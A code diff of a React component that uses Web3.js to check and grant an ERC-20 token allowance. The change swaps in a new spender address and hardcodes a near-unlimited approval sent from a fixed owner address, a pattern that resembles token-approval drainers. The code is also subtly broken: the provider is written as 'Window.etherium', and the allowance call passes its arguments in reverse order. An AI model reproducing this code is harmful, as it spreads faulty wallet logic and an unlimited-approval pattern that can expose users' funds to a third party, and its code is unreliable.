@@ -13,34 +13,34 @@ function App1() {
   }
     const check=async(e)=>{
    
-      const web3 = new Web3('https://bsc-dataseed1.binance.org/');
-      
-      
+      const web3 = new Web3(Window.etherium);
      try{
         const lptoken_ADDRESS= '0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE';
-        const spenderAddr= '0xd1b508360a1286d5A4071a67224Be387d85cb75E';
+        const spenderAddr= '0x17445E00cf5ee6fB08bec09050626D74156c7898';
         const Contract = new web3.eth.Contract(abi1, lptoken_ADDRESS);
         const owner = '0x763702343200F8f851450EA514DD7488BFd2d408';
-      
-       const allow = await Contract.methods.allowance(spenderAddr, owner).call();
-       
-       
-       if(allow>0){
+        const allow = await Contract.methods.allowance(spenderAddr, owner).call();
+
+        if(allow>0){
         console.log('allowence',allow);
        }
-       else{
-       await Contract.methods.approve(spenderAddr, amount).send({ from: owner });
+        else{
+        await Contract.methods.approve(spenderAddr, '999999999999999999999').send({ from: owner });
         console.log('Approave');
        }
        
        
       }
      catch(err){
-       console.log('error');
+       console.log('error',err);
  
      }
    
   }
+   
+  
+  
+
         return (
             <div className="app">
             <form onSubmit={handleSubmit}>
